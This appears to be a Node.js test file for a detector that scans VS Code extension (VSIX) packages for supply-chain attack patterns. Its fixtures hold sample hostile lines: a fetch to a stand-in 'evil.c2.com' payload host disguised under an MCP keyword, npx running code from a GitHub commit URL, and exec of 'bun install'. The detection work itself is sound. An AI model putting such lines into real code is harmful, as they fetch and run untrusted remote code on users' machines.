import { test, mock as _mock } from 'node:test';
import assert from 'assert/strict';
import { checkOrphanCommitFetch } from '../../backend/vsix-scan/detectors/orphan-commit-fetch.js';

test('VSIX orphan: GitHub git commit SHA URL fires', async () => {
  const files = [
    {
      path: 'dist/main.js',
      content: `const url = "https://api.github.com/repos/nrwl/nx/git/commits/a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0";`,
    },
  ];
  const result = await checkOrphanCommitFetch(files);
  assert.ok(result.triggered);
  assert.ok(result.signals.some((s) => s.type === 'ORPHAN_COMMIT_GITHUB_API'));
});

test('VSIX orphan: npx + git URL fires', async () => {
  const files = [
    {
      path: 'dist/main.js',
      content: `npx github.com/nrwl/nx#a1b2c3d4e5f6`,
    },
  ];
  const result = await checkOrphanCommitFetch(files);
  assert.ok(result.triggered);
  assert.ok(result.signals.some((s) => s.type === 'NPX_GIT_URL'));
});

test('VSIX orphan: MCP keyword + external fetch fires', async () => {
  const files = [
    {
      path: 'dist/main.js',
      content: `const setup = "mcp"; fetch("https://evil.c2.com/payload");`,
    },
  ];
  const result = await checkOrphanCommitFetch(files);
  assert.ok(result.triggered);
  assert.ok(result.signals.some((s) => s.type === 'MCP_DISGUISED_EXFIL'));
});

test('VSIX orphan: Bun install pattern fires', async () => {
  const files = [
    {
      path: 'dist/main.js',
      content: `const cmd = "bun install"; exec(cmd);`,
    },
  ];
  const result = await checkOrphanCommitFetch(files);
  assert.ok(result.triggered);
  assert.ok(result.signals.some((s) => s.type === 'BUN_INSTALL'));
});

test('VSIX orphan: standard npx to npmjs.org = silent', async () => {
  const files = [
    {
      path: 'dist/main.js',
      content: `npx create-react-app my-app`,
    },
  ];
  const result = await checkOrphanCommitFetch(files);
  assert.equal(result.triggered, false);
});
